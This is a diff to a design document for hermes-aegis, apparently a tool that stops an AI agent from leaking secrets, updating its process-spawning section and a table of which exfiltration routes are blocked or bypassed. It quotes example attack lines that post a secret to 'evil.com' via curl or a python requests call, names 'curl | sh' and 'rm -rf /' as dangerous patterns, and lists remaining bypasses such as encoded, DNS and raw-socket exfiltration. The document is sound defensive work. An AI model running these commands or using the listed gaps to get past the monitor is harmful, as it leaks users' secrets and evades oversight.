@@ -46,24 +46,32 @@ This document explains the design decisions behind what hermes-aegis does and do
 
 ---
 
-## 3. Process Spawning (❌ NOT BLOCKED)
+## 3. Process Spawning (⚠️ PARTIALLY ADDRESSED in v0.1.3)
 
 **Attack**: `subprocess.run(['curl', '-d', secret, 'evil.com '])`
 
-**Why we don't block it:**
+**Why we partially block it:**
 
 **Technical**: subprocess spawns external binaries. Our Python scanner doesn't see their arguments.
 
-**Considered alternatives:**
-1. Patch `subprocess` → args are already strings, can't reliably scan them (what if encoded?)
-2. Hook at OS exec level → requires ptrace/eBPF (Linux-only, high complexity)
-3. Seccomp filters → only available in Tier 2 containers
+**v0.1.3 update**: Patch 5 (`terminal_tool_command_scan`) adds a pre-execution check
+for dangerous command patterns. When `AEGIS_ACTIVE=1`, `hermes-aegis scan-command` is
+called before terminal commands execute. This catches dangerous patterns like
+`curl | sh`, `rm -rf /`, etc. in the command string — but does NOT scan subprocess
+arguments or prevent encoded/obfuscated exfiltration.
 
-**Trade-off**: Blocking subprocess would require OS-level hooks incompatible with Tier 1's "drop-in" design.
+**Hermes v0.2.0 update**: Hermes now has `approval.py` (27 dangerous patterns) and
+`tirith_security.py` (homograph URLs, code injection) that run before terminal
+command execution. These provide interactive approval prompting in CLI mode.
+
+**Remaining gap**: Neither Aegis nor Hermes scans subprocess arguments for secrets.
+A command like `python3 -c "import requests; requests.post('evil.com', data=secret)"`
+would be caught by Hermes's `-c` flag pattern but the secret inside wouldn't be
+detected until the HTTP request hits the proxy.
 
 **Tier 2 solution**: Container has no external binaries (minimal image). Even if spawned, curl/wget don't exist.
 
-**Status**: **Documented limitation for Tier 1, mitigated in Tier 2**.
+**Status**: **Partially mitigated in Tier 1 via pattern matching, fully mitigated in Tier 2**.
 
 ---
 
@@ -136,7 +144,7 @@ This document explains the design decisions behind what hermes-aegis does and do
 | Base64 encoding | ✅ BLOCKED | ✅ BLOCKED | Explicit check implemented |
 | DNS exfiltration | ❌ BYPASS | ⚠️ MITIGATED | Network policy in container |
 | Raw sockets | ❌ BYPASS | ✅ BLOCKED | No network in container |
-| Process spawning | ❌ BYPASS | ✅ BLOCKED | No binaries in container |
+| Process spawning | ⚠️ PARTIAL | ✅ BLOCKED | Pattern check (v0.1.3) + no binaries in container |
 | File staging | ⚠️ PARTIAL | ✅ BLOCKED | Read-only FS + net policy |
 | Hex/ROT13/etc | ❌ BYPASS | ⚠️ MITIGATED | Catches HTTP, not encoding |
 
